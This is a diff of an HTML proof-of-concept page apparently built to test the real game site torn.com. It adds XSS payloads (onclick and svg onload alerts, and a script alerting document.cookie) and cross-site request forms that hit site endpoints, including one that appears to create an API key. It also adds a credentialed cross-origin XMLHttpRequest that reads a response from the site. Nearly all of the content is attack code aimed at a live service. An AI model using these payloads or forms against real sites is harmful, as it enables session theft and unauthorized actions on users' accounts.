@@ -1,6 +1,14 @@
+<input class="search-mail-text left ac-search ui-autocomplete-input ac-focus" data-lpignore="true" type="text" placeholder="“ onclick=“alert(1)" name="term" value="" data-action="messages.php?step=search_autocomplete" id="msg-search-0" autocomplete="off">
+
+<p id="key-name-686279" class="name___Icin1">Public only key<svg onload=alert(1)></p>
+
+<a class="subject h  t-gray-3" id="subject-161402127" href="#/p=read&amp;ID=161402127&amp;suffix=outbox" title="Hey!
+Looks at this forum post, it links a guide on racing + a discord channel that I'd recommend joining if you are taking or going to take racing seriously. Hope this helps!https://www.torn.com/forums.php#/p=threads&amp;amp;f=21&amp;amp;t=16246769&amp;amp;b=0&amp;amp;a=0&amp;amp;to=21877906" i-data="i_494_620_44_14">
+Re: hey! %3cscript%3ealert(document.cookie)%3c/script%3e</a>
+
 <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
 
-<form action="https://139.180.157.68/bazaar.php" method="GET">
+<form action="https://www.torn.com/bazaar.php" method="GET">
   <div>
     <label for="sid">What greeting do you want to say?</label>
     <input name="sid" id="sid" value="bazaarData">
@@ -15,11 +23,25 @@
 </form>
 
 <!---https://www.torn.com/preferences.php#tab=api?&step=addNewKey&title=Public%20only%20key&type=1-->
-<form action="https://139.180.157.68/preferences.php#tab=api?&step=addNewKey&title=ppp&type=1" method="GET">
+<form action="https://www.torn.com/preferences.php#tab=api?&step=addNewKey&title=ppp&type=1" method="GET">
   <div>
     <button>Create</button>
   </div>
 </form>
+
+<form action="https://www.torn.com/sidebarAjaxAction.php" method="GET" target="dummyframe">
+  <div>
+    <label for="action">action</label>
+    <input name="action" id="action" value="servertime">
+  </div>
+  <div>
+    <button>Time</button>
+  </div>
+</form>
+
+
+<button onclick="var xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET', 'https://www.torn.com/sidebarAjaxAction.php?action=servertime', true); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState === 4) { alert(xmlhttp.response); } }; xmlhttp.send();">Time</button>
+
 
 <!--
             await getAction({
